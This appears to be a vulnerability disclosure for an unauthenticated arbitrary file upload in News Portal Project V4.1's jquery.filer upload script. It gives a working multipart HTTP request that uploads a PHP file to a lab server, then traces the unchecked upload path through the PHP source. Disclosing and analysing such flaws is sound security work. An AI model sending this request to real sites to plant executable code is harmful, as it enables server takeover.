# News Portal Project V4.1 File Upload Vulnerability
##### Vulnerability Location: /newsportal/plugins/jquery.filer/php/upload.php
##### Affected Range: News Portal Project V4.1
##### Vulnerability Cause: upload.php contains a file upload vulnerability, which enables the upload of files of any format to the server without identity authentication.
##### Vulnerability Impact: Attackers can exploit vulnerabilities to upload php files and obtain system permissions
##### Link: https://phpgurukul.com/news-portal-project-in-php-and-mysql/
# Vulnerability recurrence

Access address:
http://192.168.0.126:8089/plugins/jquery.filer/php/upload.php

```http
POST /plugins/jquery.filer/php/upload.php HTTP/1.1
Host: 192.168.0.126:8089
Content-Length: 185
Cache-Control: max-age=0
Origin: http://192.168.0.126:8089
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE9VXnImvty86IIns
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.126:8089/plugins/jquery.filer/php/remove_file.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=v19f7v8ibn3q2ndv04hl0g6tdl; XDEBUG_SESSION=PHPSTORM
Connection: keep-alive

------WebKitFormBoundaryE9VXnImvty86IIns
Content-Disposition: form-data; name="files"; filename="test.php"

<?php echo 'hello world!';?>
------WebKitFormBoundaryE9VXnImvty86IIns--
```

<img width="1092" height="563" alt="image" src="https://github.com/user-attachments/assets/c2668c58-78bc-4282-b88a-df96c4ca79bf" />

Access the uploaded file addressï¼š
http://192.168.0.126:8089/plugins/jquery.filer/uploads/test.p.php

<img width="962" height="174" alt="image" src="https://github.com/user-attachments/assets/4a2c961e-5136-403a-8ee2-83ec7765d1c4" />

# Code Analysis

Sink:/newsportal/plugins/jquery.filer/php/class.uploader.php
Source:/newsportal/plugins/jquery.filer/php/upload.php

```php
/**
 * uploadFile method
 *
 * Upload/Download files to server
 * @return boolean
 */
private function uploadFile($source, $destination){
    if($this->field['Field_Type'] == 'input'){
        return @move_uploaded_file($source, $destination);
    }elseif($this->field['Field_Type'] == 'link'){
        return $this->downloadFile($source, $destination);
    }
}
```

Here, you can execute "upload" or "download" based on the if condition. Then keep looking up! Look for the upper-level call of the uploadFile method.

<img width="3062" height="319" alt="image" src="https://github.com/user-attachments/assets/73de8208-d380-478c-9fee-0f5480d71883" />

There is only one place to call, where file upload is invoked within the perpareFiles method.

```php
/**
 * prepareFiles method
 *
 * Prepare files for upload/download and generate meta infos
 * @return $this->data
 */
private function prepareFiles(){
    $field = $this->field;
    $validate = $this->validate();
    
    if($validate){
        $files = array();
        $removed_files = $this->removeFiles();
        
        for($i = 0; $i < count($field['name']); $i++){
            
            $metas = array();
            
            if($field['Field_Type'] == 'input'){
                $tmp_name = $field['tmp_name'][$i];
            }elseif($field['Field_Type'] == 'link'){
                $link = $this->downloadFile($field['name'][0], false, true);
                
                $tmp_name = $field['name'][0];
                $field['name'][0] = pathinfo($field['name'][0], PATHINFO_BASENAME);
                $field['type'][0] = $link['type'];
                $field['size'][0] = $link['size'];
                $field['error'][0] = 0;
            }
            
            $metas['extension'] = substr(strrchr(strtolower($field['name'][$i]), "."),1);
            $metas['type'] = preg_split('[/]', $field['type'][$i]);
            $metas['extension'] = $field['Field_Type'] == 'link' && empty($metas['extension']) ? $metas['type'][1] : $metas['extension'];
            $metas['old_name'] = substr($field['name'][$i], 0, -(strlen(strrchr($field['name'][$i], $metas['extension']))+1));
            $metas['size'] = $field['size'][$i];
            $metas['size2'] = $this->formatSize($metas['size']);
            $metas['name'] = $this->generateFileName($this->options['title'], array('name'=>$metas['old_name'], 'size'=>$metas['size'])) . (!empty($metas['extension']) ? "." . $metas['extension'] : "");
            $metas['file'] = $this->options['uploadDir'] . $metas['name'];
            $metas['replaced'] = file_exists($metas['file']);
            $metas['date'] = date('r');
            
            if(!in_array($field['name'][$i], $removed_files) && $this->validate(array_merge($metas, array('index'=>$i, 'tmp'=>$tmp_name))) && $this->uploadFile($tmp_name, $metas['file'])){
                if($this->options['perms']) @chmod($metas['file'], $this->options['perms']);
                
                $custom = $this->_onUpload($metas, $this->field); if($custom && is_array($custom)) $metas = array_merge($custom, $metas);
                
                ksort($metas);
                
                $files[] = $metas['file'];
                $this->data['data']['metas'][] = $metas;   
            }
```

Here I only copied part of the key code! This method is mainly used to prepare file metadata before uploading and downloading. Among them, there is also a judgment, which is the validate method! This method is the way to check files!

<img width="1480" height="444" alt="image" src="https://github.com/user-attachments/assets/388eb82e-fd0d-4ac9-86d3-c68773d24bdb" />

If you continue to search for the upper-level calls, you will find that the prepareFile method is called by the initialize method! Follow up on this method:

```php
/**
 * initialize method
 *
 * Initialize field values and properties.
 * Merge options
 * Prepare files
 * @param $field {Array, String}
 * @param $options {Array, null}
 * @return array
 */
private function initialize($field, $options){
if(is_array($field) && in_array($field, $_FILES)){
  $this->field = $field;
        $this->field['Field_Name'] = array_search($field, $_FILES);
        $this->field['Field_Type'] = 'input';
        
        if(!is_array($this->field['name'])){
        $this->field = array_merge($this->field, array("name" => array($this->field['name']), "tmp_name"=>array($this->field['tmp_name']), "type"=>array($this->field['type']), "error"=>array($this->field['error']), "size"=>array($this->field['size'])));
        }
        
        foreach($this->field['name'] as $key=>$value){ if(empty($value)){ unset($this->field['name'][$key]); unset($this->field['type'][$key]); unset($this->field['tmp_name'][$key]); unset($this->field['error'][$key]); unset($this->field['size'][$key]); } }
        
        $this->field['length'] = count($this->field['name']);
}elseif(is_string($field) && $this->isURL($field)){
        $this->field = array("name" => array($field), "size"=>array(), "type"=>array(), "error"=>array());
        $this->field['Field_Type'] = 'link';
        $this->field['length'] = 1;
    }else{
        return false;   
    }
    
    if($options != null){
        $this->setOptions($options);
    }

return $this->prepareFiles();
}
```

Here, you will find that there is an if judgment. If the uploaded file is indeed a file, 
then $this->field['Field_Type'] = 'input' will be initialized; If is_string($field) && $this->isURL($field), then the file will be downloaded. 
The main function of this method is to initialize the "filed" attribute and set the corresponding value.

<img width="1332" height="427" alt="image" src="https://github.com/user-attachments/assets/abef998d-77a7-44c0-badb-f6aaae5cc2b6" />

At this point, we come to the upload method in the Uploader class! Further up is the Source point:

<img width="1854" height="439" alt="image" src="https://github.com/user-attachments/assets/b9e4cb21-805a-46f9-a23b-43fd82f9669f" />

There was no check on the file content or suffixes throughout the entire process. This eventually led to arbitrary file uploads.
